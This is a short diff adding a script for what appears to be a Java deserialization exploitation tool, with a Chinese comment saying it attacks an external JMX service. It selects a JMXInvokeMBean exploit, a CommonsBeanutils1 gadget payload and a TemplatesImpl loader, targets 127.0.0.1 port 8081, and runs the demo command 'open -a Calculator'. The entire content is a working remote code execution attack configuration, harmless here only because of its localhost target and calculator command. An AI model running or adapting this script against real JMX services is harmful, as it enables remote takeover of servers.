@@ -1,0 +1,8 @@
+# 攻击外部的JMX服务，不建立具体的server服务
+use exploit JMXInvokeMBean
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set rhost 127.0.0.1
+set rport 8081
+set body "open -a Calculator"
+run
